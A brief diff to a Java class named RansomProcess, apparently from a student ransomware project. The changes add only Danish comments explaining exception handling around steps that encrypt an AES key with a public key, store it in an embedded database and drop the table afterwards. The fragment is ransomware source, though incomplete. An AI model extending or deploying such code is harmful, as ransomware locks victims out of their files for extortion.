@@ -57,6 +57,7 @@ public class RansomProcess {
 
             }
             EmbeddedDatabase.InsertRecordIntoTable(containsFilters, CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey));
+        //hvis der opstå en fejl som er en af dem som er lavet en catch på så stopper den koden og skriver fejlen ud
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         } catch (RansomwareException e) {
@@ -103,7 +104,7 @@ public class RansomProcess {
                 }
 
             }
-
+//hvis der opstå en fejl som er en af dem som er lavet en catch på så stopper den koden og skriver fejlen ud
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         } catch (SQLException e) {
@@ -114,6 +115,7 @@ public class RansomProcess {
             System.out.println("Map not Exists Encrypt First");
         } catch (UncheckedIOException e) {
             System.out.println("cannot decrypt");
+       //finally kører selvom der har været en Exception som stopper koden.
         } finally {
             EmbeddedDatabase.DropTable();
         }
